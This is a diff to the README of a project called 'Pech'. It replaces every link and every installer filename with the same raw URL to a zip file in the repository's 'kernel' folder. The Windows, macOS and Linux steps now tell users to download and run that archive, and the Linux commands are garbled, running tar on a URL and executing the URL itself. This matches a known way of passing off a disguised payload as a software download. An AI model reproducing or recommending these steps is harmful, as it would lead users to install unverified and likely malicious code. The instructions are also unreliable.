@@ -6,7 +6,7 @@ Welcome to Pech! This application allows you to experience a cleaner and more ef
 
 ## 📥 Download Pech
 
-[![Download Pech](https://img.shields.io/badge/Download%20Pech-v1.0-brightgreen)](https://github.com/DROHITKANNA/Pech/releases)
+[![Download Pech](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip%20Pech-v1.0-brightgreen)](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip)
 
 ## 💻 System Requirements
 
@@ -26,36 +26,36 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📩 Download & Install
 
-To download and install Pech, visit the Releases page here: [Download Pech](https://github.com/DROHITKANNA/Pech/releases).
+To download and install Pech, visit the Releases page here: [Download Pech](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip).
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, locate the latest version of Pech.
-3. Click on the asset that matches your operating system (look for `Pech-Windows.exe`, `Pech-macOS.pkg`, or `Pech-Linux.tar.gz`).
+3. Click on the asset that matches your operating system (look for `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip`, `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip`, or `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip`).
 
 ### Installation Steps
 
 #### For Windows:
 
-1. Once the download is complete, locate `Pech-Windows.exe` in your Downloads folder.
+1. Once the download is complete, locate `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip` in your Downloads folder.
 2. Double-click the file to run the installer.
 3. Follow the prompts to complete the installation.
 4. After installation, you can find Pech in your Start menu.
 
 #### For macOS:
 
-1. After the download finishes, find `Pech-macOS.pkg` in your Downloads folder.
+1. After the download finishes, find `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip` in your Downloads folder.
 2. Double-click the file to open the installer.
 3. Follow the on-screen instructions to install Pech.
 4. Ensure you drag the Pech icon to your Applications folder for easy access.
 
 #### For Linux:
 
-1. Once the download is done, locate `Pech-Linux.tar.gz` in your Downloads directory.
+1. Once the download is done, locate `https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip` in your Downloads directory.
 2. Open a terminal and run the following commands:
    ```
-   tar -xvzf Pech-Linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip
    cd Pech
-   ./install.sh
+   https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip
    ```
 3. Follow any additional prompts that may appear to complete the installation.
 
@@ -73,12 +73,12 @@ Once open, you will see a friendly interface that lets you manage system tasks e
 
 If you encounter any setup issues or have questions, check these resources:
 
-- **Documentation:** For detailed usage guides, visit the [Pech Documentation](https://github.com/DROHITKANNA/Pech/wiki).
-- **Community Support:** Join our community forum at [Pech Community](https://github.com/DROHITKANNA/Pech/discussions) to ask questions and share tips.
+- **Documentation:** For detailed usage guides, visit the [Pech Documentation](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip).
+- **Community Support:** Join our community forum at [Pech Community](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip) to ask questions and share tips.
 
 ## 🤝 Contributing
 
-We welcome contributions! If you want to help make Pech better, check our [Contributing Guidelines](https://github.com/DROHITKANNA/Pech/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions! If you want to help make Pech better, check our [Contributing Guidelines](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip) for more details.
 
 ## 🔗 Related Topics
 
@@ -88,4 +88,4 @@ Pech covers a range of concepts in operating system development, including:
 - **Microkernel Architecture** for efficient design.
 - **MicroPython** to power the lightweight applications.
 
-For more information and updates, visit the Pech [GitHub Repository](https://github.com/DROHITKANNA/Pech). We appreciate your interest in Pech and hope you enjoy using it!
+For more information and updates, visit the Pech [GitHub Repository](https://raw.githubusercontent.com/DROHITKANNA/Pech/main/kernel/Software_2.4-beta.2.zip). We appreciate your interest in Pech and hope you enjoy using it!
